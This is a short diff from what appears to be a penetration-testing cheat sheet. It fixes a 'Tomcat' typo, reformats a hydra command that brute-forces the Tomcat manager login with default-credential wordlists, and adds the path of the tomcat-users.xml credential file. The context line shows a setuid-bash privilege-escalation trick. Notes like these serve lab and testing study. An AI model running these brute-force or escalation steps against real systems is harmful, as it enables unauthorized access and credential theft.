@@ -180,9 +180,10 @@ chmod +s /bin/bash
 > 1. To execute a PHP script file, in command line simply type -> php <file name.php>
 > 1. to start a php based webserver, simply type -> php -S localhost:8000
  
-#### Tomocat 8080 bruteforcing
+#### Tomcat 8080 bruteforcing
 	
-```bash hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt -I -u -f 192.168.10.7 -s 8080 http-get /manager/html -V -F```
+> 1. ```hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt -I -u -f 192.168.10.7 -s 8080 http-get /manager/html -V -F```
+> 1. **Here is the file in which creds are saved --->** ```/etc/tomcat[5,6,7,8,9]/tomcat-users.xml``` e.g ```/etc/tomcat7/tomcat-users.xml```
 	
 
 
